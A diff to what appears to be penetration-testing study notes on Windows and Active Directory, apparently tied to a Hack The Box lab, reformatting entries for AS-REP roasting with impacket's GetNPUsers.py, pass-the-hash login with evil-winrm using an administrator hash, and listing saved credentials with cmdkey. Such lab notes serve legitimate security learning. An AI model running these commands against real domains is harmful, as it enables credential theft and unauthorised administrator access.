@@ -162,10 +162,12 @@ Run WinRM commands from powershell:
 
  - GetNPUsers.py (from impacket): This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
 
-    # GetNPUsers.py domain/user -no-pass
+    GetNPUsers.py domain/user -no-pass
 
  - Pass the hash: You can connect using the hash of the user
-   * evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6
+
+    evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6
+
  - Credentials can be saved
 
     cmdkey /list
